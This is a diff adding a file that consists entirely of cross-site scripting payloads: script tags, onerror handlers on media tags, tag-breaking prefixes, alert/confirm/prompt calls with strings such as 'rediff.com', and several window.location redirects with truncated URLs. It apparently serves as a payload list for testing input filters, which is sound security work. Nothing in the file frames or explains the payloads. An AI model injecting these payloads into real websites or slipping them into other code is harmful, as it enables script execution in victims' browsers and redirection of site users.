@@ -1,0 +1,40 @@
+<video src=1 href=1 onerror="javascript:alert('alert')"></video>
+</foo="><script>javascript:confirm('rediff.com')</script>">
+<image src=1 href=1 onerror="javascript:confirm('confirm')"></image>
+<!foo="><script>javascript:prompt('prompt')</script>">
+<audio src=1 href=1 onerror="javascript:prompt('rediff.co')"></audio>
+<script>alert('rediff.co')</script>
+</foo="><script>javascript:confirm('rediff.co')</script>">
+<video src=1 href=1 onerror="javascript:alert('rediff.co')"></video>
+<image src=1 href=1 onerror="javascript:confirm('confirm')"></image>
+<video src=1 href=1 onerror="javascript:alert('rediff.info')"></video>
+<!foo="><script>javascript:prompt('rediff.gov')</script>">
+</foo="><script>javascript:confirm('rediff.gov')</script>">
+<script>window.location="https:////..."></script>
+<image src=1 href=1 onerror="javascript:confirm('rediff.com')"></image>
+<!foo="><script>javascript:prompt('rediff.co')</script>">
+<script>alert('rediff.net')</script>
+</foo="><script>javascript:confirm('rediff.net')</script>">
+<!foo="><script>javascript:prompt('tag')</script>">
+<script>window.location="https:///w..."</script>
+<script>alert('rediff.tv')</script>
+<script>window.location="https:///w..."></script>
+<!foo="><script>javascript:prompt('tag')</script>">
+<!foo="><script>javascript:prompt('tag')</script>">
+<script>alert('alert')</script>
+<!foo="><script>javascript:prompt('rediff.co')</script>">
+<script>window.location="https:///w..."</script>
+<image src=1 href=1 onerror="javascript:confirm('confirm')"></image>
+<video src=1 href=1 onerror="javascript:alert('rediff.tv')"></video>
+<script>window.location="https:///w..."></script>
+<script>alert('alert')</script>
+<script>alert('alert')</script>
+<script>alert('rediff.gov')</script>
+</foo="><script>javascript:confirm('rediff.com')</script>">
+<audio src=1 href=1 onerror="javascript:prompt('rediff.co')"></audio>
+<script>window.location="https:///w..."></script>
+</foo="><script>javascript:confirm('rediff.co')</script>">
+<audio src=1 href=1 onerror="javascript:prompt('prompt')"></audio>
+<image src=1 href=1 onerror="javascript:confirm('rediff.com')"></image>
+<audio src=1 href=1 onerror="javascript:prompt('prompt')"></audio>
+<script>alert('alert')</script>
